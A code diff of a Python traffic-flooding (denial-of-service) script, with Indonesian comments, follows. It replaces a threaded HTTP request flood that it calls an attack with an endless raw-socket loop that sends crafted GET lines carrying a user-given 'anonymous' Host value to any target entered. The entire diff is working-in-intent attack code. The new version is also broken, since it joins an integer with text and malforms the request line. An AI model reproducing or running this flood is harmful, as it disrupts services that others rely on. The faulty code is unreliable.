@@ -4,46 +4,24 @@ import socket
 import threading
 import requests
 
-# Interaksi user untuk URL target
-url = str(input("Masukan url : "))  
+URL = str(input("You web ip: "))
+port = int(input("Your port: "))
+tread = int(input("Insert number of threads: "))
 
-def serang():
-    try:
-        response = requests.get(url=url)  # Memanggil fungsi user input
-        print(f"Request berhasil : {response.status_code}")
-    except Exception as e:
-        print(f"Error: {e}")
+anunim = int(input("Masukan anonim ip: "))
 
-def gass(req, num_threads):
-    threads = []
-    
-    # Fungsi yang akan dijalankan oleh setiap thread
-    def cnn():
-        for _ in range(req):
-            serang()
+def main():
+    while True:
+        try:
+            sook = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sook.connect((URL, port))
+            sook.sendto(("GET /" + URL + "HTTP/1.1\r\n").encode('ascii'),(URL, port))
+            sook.sendto(("Host: " + anunim + "\r\n\r\n").encode('ascii'), (URL, port))
 
-    # Membuat thread
-    for i in range(num_threads):
-        thread = threading.Thread(target=cnn)
-        thread.start()
-        threads.append(thread)
+        except Exception as e:
+            print(f"condision Error: {e}")
+            sook.close()
 
-    # Menunggu semua thread selesai
-    for thread in threads:
-        thread.join()
-
-if __name__ == "__main__":
-    req = 100  # Jumlah request per thread
-    num_threads = 50  # Jumlah thread
-
-    attack_duration = 10  # Durasi serangan dalam detik
-    end_time = time.time() + attack_duration
-
-    print(f"Melakukan serangan ke: {url} selama: {attack_duration} detik")
-
-    # Loop untuk menjalankan serangan sampai waktu yang ditentukan
-    while time.time() < end_time:
-        gass(req, num_threads)
-        # time.sleep(0.1)  # Jika ingin lebih cepat, bisa dihilangkan atau diatur lebih kecil
-
-    print("Serangan selesai!")
+for i in range(tread):
+    tdr = threading.Thread(target=main)
+    tdr.start()
